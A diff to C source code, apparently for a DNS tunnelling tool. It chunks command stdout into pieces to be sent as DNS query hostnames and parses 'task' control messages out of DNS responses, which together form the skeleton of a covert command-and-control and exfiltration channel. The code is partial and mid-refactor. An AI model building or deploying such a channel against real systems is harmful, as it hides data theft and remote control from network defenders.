@@ -15,6 +15,7 @@
 #include "dns-protocol.h" // for calling self createDnsRfcQueryString()
 #include "dns-packet.h"   // structure definitions and size calculations
 #include "bufferHelper.h" // for copyString
+#include "linked-list.h"
 
 #include "sockets.h"
 // global variables
@@ -51,7 +52,7 @@ unsigned int debug = 1;
  *
  *
  * arguments - _fqdn => The fully qual domain name to go inside QNAME field
- * 						The fqdn typically consists of host.SLD.TLD.
+ * 						The hostName typically consists of host.SLD.TLD.
  *
  * 			 - _sendLen => the size of our udp payload for socket functions
  *
@@ -67,7 +68,7 @@ unsigned char *createDnsQueryPacket(unsigned char *_host,
 	// to keep track of put()'s
 	int buffIndex = 0;
 	unsigned char *dnsQueryPacket;
-	unsigned char *fqdn = appendString(_host, _domain);
+	unsigned char *hostName = appendString(_host, _domain);
 
 	struct DNS_HEADER *ptrStructDnsH;
 	struct DNS_QUESTION *ptrStructDnsQ;
@@ -83,7 +84,7 @@ unsigned char *createDnsQueryPacket(unsigned char *_host,
 						);
 
 	/* create and fill in a DNS_QUESTION struct */
-	ptrStructDnsQ = buildDnsQuestion(fqdn, QTYPE_A, QCLASS_IN);
+	ptrStructDnsQ = buildDnsQuestion(hostName, QTYPE_A, QCLASS_IN);
 
 	//printf("[-] Printing DNS Query Message Packet \n");
 	//printf("DNS Header Section \n");
@@ -399,56 +400,57 @@ struct DNS_QUESTION *buildDnsQuestion(unsigned char *qNameArg,
 
 
 /*
- * function name - buildFqdnList
+ * function name - buildStdoutChunk list
  *
- * arguments - stdoutChunk => represents a chunk of a larger stdout buffer
- *			   domainName  => represents the second and top level domain
+ * arguments - stdoutBuffer => represents a chunk of a larger stdout buffer
+ *			   stdoutSize   => represents the size of the stdout Buffer
  *
  * return value - pointer to the head node of this list !
  *
  * comments - If no chunking, list should have 1 node excluding head node?
  *
  * 			  When to use strlen vs, custom strlen for non-ascii bytes?
+ * 			  Strlen should be okay unless we have 0's null bytes in our
+ * 			  stdout.. we should have all ascii bytes anyway, but 0
+ * 			  may cause strlen to return early.. 0 ascii is hex 30
+ * 			  hex 0 is NULL byte.. may be okay still??
  *
  * 			  Check return values of malloc.. free when?
  *
  * 			  Function is cool because it seperates the functionality of
- * 			  chunking then sending right away, to chunking and store, then send
+ * 			  chunking then sending right away, to chunking and store,then send
  * 			  when ever you want at what ever pace and order desired !
  *
  * 			  When appending a std out chunk to domain name, need to add
  * 			  a period to the end of the stdout buff sdfijsdiofjsdf>.<cnn.com
  *
  */
-struct FQDN_NODE *constructFqdnList(unsigned char *_stdoutBuffer,
-										unsigned char *_domainName,
-											int _stdoutSize)
+struct NODE *constructStdoutList(unsigned char *_stdoutBuffer,
+									int _stdoutSize)
 {
 	if(debug)
 	{
-		printf("===== buildFqdnList() ===== \n");
+		printf("===== constructStdoutList() ===== \n");
 		printf("stdoutBuffer> %s \n", _stdoutBuffer);
-		printf("domain-> %s 	 \n", _domainName);
+		printf("stdoutBuffer Size-> %u 	 \n", _stdoutSize);
 		printf("----------------------------\n");
 	}
 
 	// each list member structure defined below
-	struct FQDN_NODE *head;
+	///struct STDOUT_CHUNK_NODE *head;
 	int chunkSize = 30;
-	int domainSize = strlen(_domainName); // error handling.. strlen <= 0
 	int mallocAmt = 0;
 
 	printf("chunkSize: %u \n", chunkSize);
-	printf("domainSize: %u \n", domainSize);
 	printf("stdoutSize: %u \n", _stdoutSize);
 
-	/* allocate memory for head node */
-	head = malloc(sizeof(struct FQDN_NODE)); // make sure to free !
-	head->fqdn = 0;
-	head->size = 0;
-	head->next = 0;
+	struct NODE *head = NULL; //createList();
 
-	/* create fqdn from stdoutBuffer chunk and _domain */
+	/* allocate memory for head node */
+
+	////head = malloc(sizeof(struct STDOUT_CHUNK_NODE)); // make sure to free !
+	//head->stdoutHostname = NULL;
+	////head->next = NULL;
 
 	// keep track of index into _stdoutBuffer.. while loop here?
 	int bytesTransmitted = 0;
@@ -457,163 +459,38 @@ struct FQDN_NODE *constructFqdnList(unsigned char *_stdoutBuffer,
 	// while we have not grabbed each byte of stdout
 	while(bytesRemaining > 0)
 	{
-		//printf("bytes transmitted: %u \n", bytesTransmitted);
-		//printf("bytes remaining: %u \n\n", bytesRemaining);
+		printf("bytes transmitted: %u \n", bytesTransmitted);
+		printf("bytes remaining: %u \n\n", bytesRemaining);
 
-		// before pushing to FQDN Node, need to create the FQDN by appending.
-		unsigned char fqdn[255];
+		// before pushing to hostName Node, need to create the hostName by appending.
+		///unsigned char hostName[64];
 
 		if(bytesRemaining <= chunkSize)
 		{
-			memcpy(fqdn, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
-			memcpy(&(fqdn[bytesRemaining]), _domainName, domainSize);
-
-			push(head, fqdn, strlen(fqdn)+1);
+			//memcpy(hostName, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
+			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), bytesRemaining);
 			bytesTransmitted = bytesRemaining;
 			bytesRemaining = 0;
 		}
 		else // we have at least 1 more than chunkSize bytes left
 		{
-			memcpy(fqdn, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
-			memcpy(&(fqdn[chunkSize]), _domainName, domainSize);
-
-			push(head, fqdn, strlen(fqdn)+1);
+			//memcpy(hostName, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
+			enqueue(&head, &(_stdoutBuffer[bytesTransmitted]), chunkSize);
 			bytesTransmitted = (bytesTransmitted + chunkSize);
 			bytesRemaining = (_stdoutSize - bytesTransmitted);
 		}
 
-		// clear fqdn
-		memset(fqdn, '\0', 255);
+		// clear hostName
+		//memset(hostName, '\0', 255);
 	}
 
 	//printf("bytes transmitted: %u \n", bytesTransmitted);
 	//printf("bytes remaining: %u \n", bytesRemaining);
 
 	if(debug)
-		printf("=====/end buildFqdnList() ===== \n");
+		printf("=====/end constructStdoutList() ===== \n");
 
 	return head;
-}
-
-// this method will be responsible for printing out the
-// data field value associated with each node in the list
-void printList(struct FQDN_NODE *head)
-{
-	if(debug)
-	{
-		printf("\n===== printList() ===== \n");
-		//printf("head -> fqdn: %s \n", head->fqdn);
-		//printf("head -> size: %u \n", head->size);
-		//printf("------------------------\n");
-	}
-
-	// create a local pointer to walk the list
-	struct FQDN_NODE *current = head;
-
-	// now the value of current = = the value of head
-	// they each contain the memory address of the head variable
-
-	// loop through each node in the list and print the value
-	while (current->next != NULL)
-	{
-		// print out the first data field in the list
-
-		// send too
-		//sendQuery(current->fqdn, current->size, NULL);
-		//sleep(3);
-		printf("current ~ fqdn: %s \n", current->fqdn);
-		printf("current ~ size: %u \n\n", current->size);
-
-		// at this point, the current pointer still points at head
-		// we need to modify the value of current, by assigning it
-		// the value associated with its 'next' member
-		current = current->next;
-
-		// now the current variable value has been modified and now
-		// contains a new memory address corresponding to the next
-		// node that had been linked in previously
-
-		// if the value of current = NULL, as would be the case
-		// when the end of the list was reached and the next data member
-		// had been changed to NULL, then we are at the end of the list
-		// ie "node1->next = NULL;"
-	}
-
-	// current->next == NULL here.. end of list but we can still print this node
-	printf("tail node ~ fqdn: %s \n", current->fqdn);
-	printf("tail node ~ size: %u \n", current->size);
-
-	if(debug)
-			printf("=====/end printList() ===== \n");
-}
-
-// push() aka insertAtFront()..
-// need to insertAtEnd()
-
-// bugs --- the head node fields are empty? is this a wasted node space?
-// when assigning data to head node, what to make head->next so that no more
-// data is assigned to hea node..
-void push(struct FQDN_NODE *head,
-				unsigned char *_fqdn,
-					unsigned int _dataSize)
-{
-	if(debug)
-	{
-		printf("===== push() ===== \n");
-		//printf("head->fqdn: %s \n", head->fqdn);
-		//printf("head->size: %u \n", head->size);
-		//printf("head->next: %p \n", head->next);
-		//printf("----------------------------\n");
-	}
-
-	// if head->next is not null -- there is at least 2 nodes in the entire list
-	// enter if statement if head->next is not null (at least 2 node in list)
-	// or head->fqdn != NULL (there is one node in the list with data, add 2)
-	if (head->next != NULL || head->fqdn != NULL)
-	{
-		// 0.) allocate memory for new node
-		struct FQDN_NODE *newNode = malloc(sizeof(struct FQDN_NODE));
-
-		// 1.) alloc memory for fqdn string member
-		newNode->fqdn = malloc(_dataSize);
-
-		// 2.a) assign values at member fqdn
-		memcpy(newNode->fqdn, _fqdn, _dataSize);
-
-		// 2.b) assign values at member fqdn
-		newNode->size = _dataSize;
-
-		// 2.c) set newNode->next to NULL
-		newNode->next = NULL;
-
-		// we need to make sure we are at the end of the list before we add a new one
-		struct FQDN_NODE *current = head;
-
-		while (current->next != NULL)
-		{
-			current = current->next;
-		}
-
-		// at end of list now
-		current->next = newNode;
-
-	} // end if
-	else // else head->next is NULL - there is only 1 node "head"
-	{
-		// 1.) alloc memory for fqdn string member
-		head->fqdn = malloc(_dataSize);
-
-		// 2.a) assign values at member fqdn
-		memcpy(head->fqdn, _fqdn, _dataSize);
-
-		// 2.b) assign values at member fqdn
-		head->size = _dataSize;
-
-		head->next = NULL; // if this remains null the if will never enter
-	}
-
-	if(debug)
-		printf("=====/end push() ===== \n");
 }
 
 
@@ -673,7 +550,6 @@ struct DNS_RESPONSE_PACKET *parseDnsResponse(unsigned char *_recvBuff,
 	if(debug)
 		printf("====/end parseDnsResponse() ==== \n");
 
-	// LOOOOOOOOOOOOOL was returning a null pointer.. 0
 	return response;
 }
 
@@ -714,10 +590,11 @@ void printControlFields(struct CONTROL *c)
 	printf("[+] Printing Control Fields \n");
 
 	// printing dns header
-	printf("Client id: %x \n", 		c->clientId);
-	printf("Message Type: %x \n", 	c->messageType);
-	printf("Message Length: %x \n", c->messsageLength);
-	printf("Message <task>: "); stringPrinter(c->message, 3); printf("\n");
+	printf("Client id: %u \n", 		c->clientId);
+	printf("Message Type: %u \n", 	c->messageType);
+	printf("Message Length: %u \n", c->messsageLength);
+	printf("Message <task>: "); stringPrinter(c->message, c->messsageLength);
+	printf("\n");
 }
 
 // create control struct that is perhaps protocol agnostic
@@ -733,7 +610,7 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 
 	struct CONTROL *ctrl = malloc(sizeof(struct CONTROL));
 
-	int offset = MESSAGE_TYPE_OFFSET;
+	int offset = MESSAGE_TYPE_PARSE_OFFSET;
 
 	/* get messageType */
 	fetchChar(&(ctrl->messageType), drp->dnsQuestion.qname, &offset);
@@ -743,11 +620,10 @@ struct CONTROL *getControl(struct DNS_RESPONSE_PACKET *drp)
 
 	/* get message itself */
 	// 1.) allocate storage for message
-	//ctrl->message = malloc(sizeof(ctrl->messsageLength) * sizeof(unsigned char));
-	ctrl->message = malloc(3 * sizeof(unsigned char));
+	ctrl->message = malloc(sizeof(ctrl->messsageLength)*sizeof(unsigned char));
 	fetchString(ctrl->message,
 					drp->dnsQuestion.qname,
-						3,
+						ctrl->messsageLength,
 							&offset);
 
 	if(debug)
